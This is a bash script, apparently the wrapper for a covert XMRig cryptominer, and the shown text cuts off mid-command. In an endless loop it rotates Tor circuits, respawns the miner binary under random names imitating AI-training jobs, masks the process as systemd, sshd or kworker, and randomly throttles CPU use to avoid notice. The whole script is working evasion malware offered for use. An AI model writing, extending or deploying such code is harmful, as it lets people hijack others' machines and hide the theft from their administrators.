#!/bin/bash

# Infinite loop for changing IP
while true; do
  # Randomize sleep time between 5 to 30 minutes
  sleep_time=$(shuf -i 300-1800 -n 1)
  sleep $sleep_time

  # Decide whether to change IP with a 70% chance
  should_change_ip=$(shuf -i 1-100 -n 1)
  if [ "$should_change_ip" -lt 70 ]; then
    # Check if Tor is running before changing circuits
    if pgrep -x "tor" > /dev/null; then
      echo "Requesting Tor to change circuit..."
      kill -HUP $(pgrep tor)
      echo "Tor circuit has been changed."
    else
      echo "Tor is not running, cannot change circuit."
    fi
  else
    echo "Keeping current IP for this cycle."
  fi

  # Stop the old process if it exists
  if [ -f /root/model.txt ]; then
    CURRENT_NAME=$(cat /root/model.txt)
    echo "Stopping old process: $CURRENT_NAME"
    pkill -f "/usr/sbin/$CURRENT_NAME"
  fi

  # Remove the old process file if it exists
  if [ -f /usr/sbin/$CURRENT_NAME ]; then
    echo "Removing old process file: $CURRENT_NAME"
    rm -f /usr/sbin/$CURRENT_NAME
  fi

  # List of system process names to disguise as
  SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

  # Randomly select a system process name
  RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

  # List of AI training process names
  AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")

  # Select random AI process name and generate a number
  RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}
  RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)

  # Create the final process name
  FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
  echo $FINAL_NAME > /root/model.txt

  # Copy and rename the original systemdd file to the new name
  cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME

  # Calculate number of threads based on random CPU percentage
  TOTAL_CORES=$(nproc)
  cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
  CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)

  # Assign the process to multiple cores using taskset
  CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))

  # Limit system power usage between 50% and 90% with cpulimit
  TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))
  CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)
  CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))

  # Restart the process with limited CPU and under a new process name
  echo "Restarting XMRig (systemdd) with process name: $FINAL_NAME"
  sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset
